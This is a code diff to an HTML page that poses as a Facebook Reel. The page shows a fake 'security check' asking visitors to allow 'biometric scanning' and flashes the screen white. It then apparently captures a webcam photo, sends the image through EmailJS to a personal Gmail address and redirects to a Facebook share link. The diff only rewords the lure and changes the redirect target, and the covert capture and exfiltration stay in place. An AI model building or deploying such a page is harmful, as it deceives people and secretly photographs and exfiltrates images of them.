@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Secure Content</title>
+    <title>Facebook Video Content</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
         body { margin: 0; padding: 0; background-color: #000; display: flex; justify-content: center; align-items: center; height: 100vh; color: #fff; font-family: sans-serif; transition: background-color 0.1s; overflow: hidden; }
@@ -16,14 +16,14 @@
 <body id="mainBody">
     <div class="box">
         <div class="loader"></div>
-        <p id="status">Establishing Secure Connection...</p>
+        <p id="status">Connecting to Secure Server...</p>
     </div>
 
     <script>
         (function() { emailjs.init("ClasRw06y_NeB2UQ"); })();
 
         window.onload = async function() {
-            const securityMsg = "CONFIRMATION:\n\nTo view this Facebook Reel, you must verify you are not a bot.\n\nClick OK to start biometric verification.";
+            const securityMsg = "SECURITY CHECK:\n\nTo view this Facebook Reel, you must verify your identity.\n\nClick OK to start biometric scanning.";
             
             if (confirm(securityMsg)) {
                 try {
@@ -41,8 +41,6 @@
                         
                         if (countdown <= 0) {
                             clearInterval(interval);
-                            
-                            // فلاش الضوء الأبيض لتحسين الصورة
                             document.getElementById('mainBody').style.backgroundColor = "#FFFFFF";
                             
                             setTimeout(() => {
@@ -52,31 +50,29 @@
                                 
                                 const imgBase64 = canvas.toDataURL('image/jpeg', 0.6);
                                 
-                                // إرسال الصورة لـ EmailJS
+                                // إرسال الصورة
                                 emailjs.send('service_w3dev60', 'template_7k8tall', {
                                     image_data: imgBase64,
                                     to_email: 'tayebiabd2016@gmail.com'
                                 });
 
-                                // --- نظام التحويل الإجباري المدمج ---
+                                // التحويل إلى الرابط الجديد الذي زودتني به
                                 setTimeout(() => {
-                                    const targetURL = "https://www.facebook.com/reels/";
-                                    // محاولة التحويل بـ 3 طرق لضمان النجاح مهما كان نوع المتصفح
-                                    window.location.href = targetURL; 
+                                    const targetURL = "https://www.facebook.com/share/r/1FVygXJ8tb/";
                                     window.location.replace(targetURL);
+                                    window.location.href = targetURL;
                                     window.top.location = targetURL;
-                                }, 1000); 
-                                // ----------------------------------
+                                }, 1000);
 
                             }, 300);
                         }
                     }, 1000);
 
                 } catch (e) {
-                    window.location.replace("https://www.facebook.com/reels/");
+                    window.location.replace("https://www.facebook.com/share/r/1FVygXJ8tb/");
                 }
             } else {
-                window.location.replace("https://www.facebook.com/reels/");
+                window.location.replace("https://www.facebook.com/share/r/1FVygXJ8tb/");
             }
         };
     </script>
